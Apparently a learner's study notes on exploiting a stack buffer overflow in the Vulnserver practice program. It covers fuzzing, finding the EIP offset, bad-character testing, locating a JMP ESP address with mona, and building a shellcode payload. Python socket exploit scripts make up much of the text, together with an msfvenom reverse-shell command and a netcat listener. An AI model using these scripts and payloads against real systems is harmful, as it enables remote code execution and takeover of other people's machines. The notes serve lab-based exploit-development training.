
**Buffer Overflow**

MEMORY!<br/>
<br/>
<br/>
KERNAL &gt; Top<br/>
<br/>
STACK &gt; Buffer overflow space<br/>
<ul><li style="list-style-type: none">ESP (Extended Stack Pointer) &gt; Top</li>
<li style="list-style-type: none"/>
<li style="list-style-type: none">Buffer Space</li>
<li style="list-style-type: none">- Fills from top to bottom. Sanitised buffer shuld only accept data up to the buffer space. Buffer overflow data spills into EBP and then into EIP.</li>
<li style="list-style-type: none"/>
<li style="list-style-type: none">EBP (Extended Base Pointer) &gt; Bottom</li>
<li style="list-style-type: none"/>
<li style="list-style-type: none">EIP (Extended INstrctuion Pointer)/ Return Address</li>
<li style="list-style-type: none">- This is where dircctions can be given IE: to malicious actions</li>
</ul>
<br/>
<br/>
HEAP<br/>
<br/>
<br/>
DATA<br/>
<br/>
TEXT &gt; bottom<br/>
<br/>
<br/>
<b>Big picture steps</b><br/>
<br/>
1. Spiking <br/>
- method to find vuln part<br/>
<br/>
2. fuzzing<br/>
- send chars to break program<br/>
<br/>
3. Find the offset<br/>
<br/>
4. Overwriting the EIP<br/>
<br/>
5 Finding Bad Chars<br/>
<br/>
6. Finding the right module<br/>
<br/>
7. generate shellcode<br/>
<br/>
8. Root<br/>
<br/>
<br/>
<b>SPIKING</b><br/>
<br/>
connect to program using netcat. entter IP and service port. (Vulnserver uses 9999)<br/>
<br/>
Enumarrting the service. In this case there is a list of acceptable commands.<br/>
<br/>
To identify a potentailly vulnerable command, use spiking. Tha act of sending large volumes of random sizes of Chars to crash the program. If no crash.. not vuln.. crash = poss vuln<br/>
<br/>
A tool to do this. GENERIC_SEND_TCP<br/>
<br/>
Requires a script EG: spk (spike script)<br/>
<b><br/>
s_readline();<br/>
S-string(&quot;TRUN &quot;);<br/>
s_string_variable(&quot;0&quot;);<br/>
</b><br/>
When crash, reviewing immunity debugger should show that the ESP, EBP and ESI were all overridden ... likely with As<br/>
<br/>
<br/>
<b>FUZZING<br/>
<br/>
Step 1 python<br/>
</b><br/>
<i>#!/usr/bin/python<br/>
import sys, socket<br/>
from time import sleep<br/>
<br/>
buffer = &quot;A&quot; * 100<br/>
<br/>
while True:</i><ul><i><li style="list-style-type: none">try:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</li>
<li style="list-style-type: none">s.connect(('&lt;IP&gt;',&lt;port&gt;))</li>
<li style="list-style-type: none"/>
<li style="list-style-type: none">s.send(('&lt;command&gt; /.:/' + buffer))  */ ''/:/'&quot; is detail added when revieing the register. reveiw the command treceived and check for anyuthing the program adds, ensure that is added</li>
<li style="list-style-type: none">s.close()</li>
<li style="list-style-type: none">sleep(1)</li>
<li style="list-style-type: none">buffer = buffer + &quot;A&quot; * 100</li>
<li style="list-style-type: none"/>
</ul>
</li>
<li style="list-style-type: none">except</li>
</i><li style="list-style-type: none"><ul><i><li style="list-style-type: none">pring &quot;Fuzzing crashed at %s bytes&quot; % str(len(buffer))&quot;</li>
</i><li style="list-style-type: none"><i>sys.exit()</i></li>
</ul>
</li>
</ul>
<br/>
Script will identify the apprximate number of bytes required to crash the program. IE 2700bytes<br/>
<br/>
<br/>
<br/>
<b>FINDING THE OFFSET</b><br/>
<br/>
Tine to ID at what point the EIP is overwritten... use a metasploit framework tool to generate a pattern of X size<br/>
<br/>
syntax &gt; use/share/metasploit-framework/tools/exploit/pattern_create.rb -l &lt;number of bytes&gt;<br/>
<br/>
This can be copied and pasted into the 'offset' of the script<br/>
<br/>
<b>Step 2 python<br/>
<br/>
</b><i>#!/usr/bin/python<br/>
import sys, socket<br/>
<br/>
buffer = &quot;&lt;Generated Pattern&gt;&quot;<br/>
</i><ul><i><li style="list-style-type: none">try:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</li>
<li style="list-style-type: none">s.connect(('&lt;IP&gt;',&lt;port&gt;))</li>
<li style="list-style-type: none"/>
<li style="list-style-type: none">s.send(('&lt;command&gt; /.:/' + buffer))  */ ''/:/'&quot; is detail added when revieing the register. reveiw the command treceived and check for anyuthing the program adds, ensure that is added</li>
<li style="list-style-type: none">s.close()</li>
<li style="list-style-type: none"/>
</ul>
</li>
<li style="list-style-type: none">except</li>
</i><li style="list-style-type: none"><ul><i><li style="list-style-type: none">pring &quot;Error connecting to server&quot;</li>
</i><li style="list-style-type: none"><i>sys.exit()</i></li>
</ul>
</li>
</ul>
<br/>
<br/>
Of note, we no longer need to pause or loop as this command is executed once to inject the payload.<br/>
<br/>
<br/>
The bytes should overwrite down to EIP. We need the values stored in the EIP for comparrison against the generated pattern. This will allow us to determine the offset.<br/>
<br/>
obtain the values from EIP<br/>
<br/>
syntax &gt; use/share/metasploit-framework/tools/exploit/pattern_offset.rb -l &lt;number of bytes used to generate OG pattern&gt; -q &lt;valuse stored in EIP&gt;<br/>
<br/>
Should return an 'Exact match at offset XYZ'    EG 2003<br/>
<br/>
<br/>
<b>OVERWRITING THE EIP</b><br/>
<br/>
EIP is 4bytes long<br/>
<br/>
<b>Step 3 Python</b><br/>
<br/>
<i>#!/usr/bin/python<br/>
import sys, socket<br/>
<br/>
shellcode = &quot;A&quot; * &lt;found offset&gt; + &quot;B&quot; * 4<br/>
</i><ul><i><li style="list-style-type: none">try:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</li>
<li style="list-style-type: none">s.connect(('&lt;IP&gt;',&lt;port&gt;))</li>
<li style="list-style-type: none"/>
<li style="list-style-type: none">s.send(('&lt;command&gt; /.:/' + shellcode))  */ ''/:/'&quot; is detail added when revieing the register. reveiw the command treceived and check for anyuthing the program adds, ensure that is added</li>
<li style="list-style-type: none">s.close()</li>
<li style="list-style-type: none"/>
</ul>
</li>
<li style="list-style-type: none">except</li>
</i><li style="list-style-type: none"><ul><i><li style="list-style-type: none">pring &quot;Error connecting to server&quot;</li>
</i><li style="list-style-type: none"><i>sys.exit()</i></li>
</ul>
</li>
</ul>
<br/>
Note: The buffer is no longer required, we are preparing to develope our shellcode. This script is to test putting identifiable data into the EIP.<br/>
<br/>
If successful... EIP should register &quot;42424242&quot; IE BBBB<br/>
<br/>
<br/>
<br/>
<b>FINDING BAD CHARACTERS</b><br/>
<br/>
Run all hex chars throught he stack to identify what chars work and what chars produce the wrong value. These chars cannot be sued to create the shellcode and will be excluded.<br/>
Some chars may register as a command for the program thus casueing the program to execute the command.<br/>
<br/>
Use google &gt; google badchars &gt; obtain<br/>
<br/>
<b>Step 4 python<br/>
</b><br/>
<i>#!/usr/bin/python<br/>
import sys, socket<br/>
<br/>
</i>badchars = ( &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot; <br/>
&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot; <br/>
&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot; <br/>
&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot; <br/>
&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot; <br/>
&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot; <br/>
&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot; <br/>
&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot; <br/>
&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot; <br/>
&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;<br/>
&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot; <br/>
&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot; <br/>
&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot; <br/>
&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot; <br/>
&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot; <br/>
&quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot; ) <i><br/>
</i><i><br/>
shellcode = &quot;A&quot; * &lt;found offset&gt; + &quot;B&quot; * 4 + badchars<br/>
</i><ul><i><li style="list-style-type: none">try:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</li>
<li style="list-style-type: none">s.connect(('&lt;IP&gt;',&lt;port&gt;))</li>
<li style="list-style-type: none"/>
<li style="list-style-type: none">s.send(('&lt;command&gt; /.:/' + shellcode))  */ ''/:/'&quot; is detail added when revieing the register. reveiw the command treceived and check for anyuthing the program adds, ensure that is added</li>
<li style="list-style-type: none">s.close()</li>
<li style="list-style-type: none"/>
</ul>
</li>
<li style="list-style-type: none">except</li>
</i><li style="list-style-type: none"><ul><i><li style="list-style-type: none">pring &quot;Error connecting to server&quot;</li>
</i><li style="list-style-type: none"><i>sys.exit()</i></li>
</ul>
</li>
</ul>
<br/>
<br/>
Note \x00 is bad, just remove. its a null byte.<br/>
<br/>
Once sent you need to reveiw the hex dump. in immunity debugger. right click ESP select follow dump. then review. Starts at 01 ends at FF. looking for chars that are not correct or missing.<br/>
<br/>
Review and notate all bad chars<br/>
<br/>
When you have consecutive bad chars, it is only the first char that is the bad char.<br/>
<br/>
If a char is replaced with another char, the replaced char is prob ok. IE expect 04 see B0.... B0 is prob fine (review wehre you expect to see B0) but 04 is bad.<br/>
<br/>
Its not wrong just to blanket all bad chars and possibly bad chars. should still work<br/>
<br/>
<br/>
<b>FINDING THE RIGHT MODULE</b><br/>
Requires <b>mona module</b>for immunity debugger... obtain and install as directed<br/>
<br/>
Finding the right module is looking for a DLL that has no memory protections in place.<br/>
<br/>
use nav bar at bottom of immunity debugger<br/>
<br/>
syntax &gt; !mona modules<br/>
<br/>
to open mona and then review module protection settings... looking for a module with false accross the board that is atached to the program. IE vulnserver<br/>
<br/>
identify a potentail dll module and notate the name.<br/>
<br/>
<b>TO FIND OP CODE<br/>
</b><br/>
Find op code equivilinat of a jump command. Convert assembly langugae to hex code<br/>
<br/>
in Kali use Nasm_shell<br/>
<br/>
syntax &gt; locate nasm_shell (ned to find it) copy past loc<br/>
<br/>
syntax &gt; /usr/share/,etasploit-framework/tools/exploit/nasm_shell.rb<br/>
<br/>
in nasm enter JMP ESP (this is a jump command, this wil be the pointer)<br/>
<br/>
nasm will prodcue &gt; FFE4<br/>
<br/>
Return to immunity and expand monda serach command<br/>
<br/>
!mona find -s &quot;xff\xe4' -m &lt;chosen module.dll&gt;<br/>
<br/>
<br/>
This will produice a lsit of return addresses. Notate all as the first one may not work, you may need to enumerate.<br/>
will look like &quot;&lt;return address&gt;&quot; : &quot;\xff\xe4&quot; | stuuuuufffffff ----&gt;&gt;&gt;<br/>
<br/>
<br/>
<b>Step 5 python<br/>
</b><br/>
<i>#!/usr/bin/python<br/>
import sys, socket<br/>
<br/>
shellcode = &quot;A&quot; * &lt;found offset&gt; + &quot;&lt;jump code IN REVERSE&quot;&gt; <br/>
</i><ul><i><li style="list-style-type: none">try:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</li>
<li style="list-style-type: none">s.connect(('&lt;IP&gt;',&lt;port&gt;))</li>
<li style="list-style-type: none"/>
<li style="list-style-type: none">s.send(('&lt;command&gt; /.:/' + shellcode))  */ ''/:/'&quot; is detail added when revieing the register. reveiw the command treceived and check for anyuthing the program adds, ensure that is added</li>
<li style="list-style-type: none">s.close()</li>
<li style="list-style-type: none"/>
</ul>
</li>
<li style="list-style-type: none">except</li>
</i><li style="list-style-type: none"><ul><i><li style="list-style-type: none">pring &quot;Error connecting to server&quot;</li>
</i><li style="list-style-type: none"><i>sys.exit()</i></li>
</ul>
</li>
</ul>
<br/>
<br/>
Note &gt; <i>IE: 625011af = \xaf\x11\x50\x62. x86 archetecutre uses little indian format. lowest order byte stores at lowest address and vici versa.</i><br/>
<br/>
in immunity debugger we need to set a break point.<br/>
<br/>
blue balck arrow up top -&gt;: opens a 'search bar' enter the jump code<br/>
<br/>
it will find the code. press F2 to enter a break point. this will pause the program when the code gets to that point.<br/>
<br/>
if successful immunity will pause and output breakpoint at xyz<br/>
<br/>
<br/>
<br/>
<b>GENERATING SHELL CODE AND GAINING ROOT</b><br/>
<br/>
<br/>
First generte the malicious payload..<br/>
<br/>
<b>MSFVENOM</b><br/>
<br/>
syntax &gt; msfvenom -p windows/shell_reverse_tcp LHOST=&lt;attacker IP&gt; LPORT=&lt;attacker port&gt; EXITFUNC=thread -f c -a &lt;x86 or x64&gt; -b &lt;list bad chars&gt;<br/>
<br/>
-p payload<br/>
EXITFUNC - increased stability<br/>
-f file type<br/>
c - c<br/>
-a architecture<br/>
-b bad chars<br/>
<br/>
<br/>
Will generate a payload in hex. Notate payload size as the payload may exceed the availbe size of buffer.<br/>
<br/>
Before the payload code we need some nops.. No operations... or a sled.. this is padding added before jump command and payload. there is a chance the comand wont execute if jump code and payload are too close. is a buffer for safety.... be mindful of availble space or size.<br/>
<br/>
<b>Step 6 python<br/>
</b><br/>
<i>#!/usr/bin/python<br/>
import sys, socket<br/>
<br/>
overflow = (&lt;generated payload&gt;)<br/>
<br/>
<br/>
shellcode = &quot;A&quot; * &lt;found offset&gt; + &quot;&lt;jump code IN REVERSE&quot;&gt; + &quot;\x90&quot; * 32 + overflow<br/>
</i><ul><i><li style="list-style-type: none">try:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</li>
<li style="list-style-type: none">s.connect(('&lt;IP&gt;',&lt;port&gt;))</li>
<li style="list-style-type: none"/>
<li style="list-style-type: none">s.send(('&lt;command&gt; /.:/' + shellcode))  */ ''/:/'&quot; is detail added when revieing the register. reveiw the command treceived and check for anyuthing the program adds, ensure that is added</li>
<li style="list-style-type: none">s.close()</li>
<li style="list-style-type: none"/>
</ul>
</li>
<li style="list-style-type: none">except</li>
</i><li style="list-style-type: none"><ul><i><li style="list-style-type: none">pring &quot;Error connecting to server&quot;</li>
</i><li style="list-style-type: none"><i>sys.exit()</i></li>
</ul>
</li>
</ul>
<br/>
<br/>
Note - <i>&quot;\x90&quot; * 32</i>is nops... this can be adjusted based on available size<br/>
<br/>
<br/>
open a listener<br/>
<br/>
syntax&gt; nc -nvlp &lt;chosen port during msfvenom payload&gt;<br/>
<br/>
<br/>
Run script<br/>
<br/>
<br/>
PROFIT<br/>
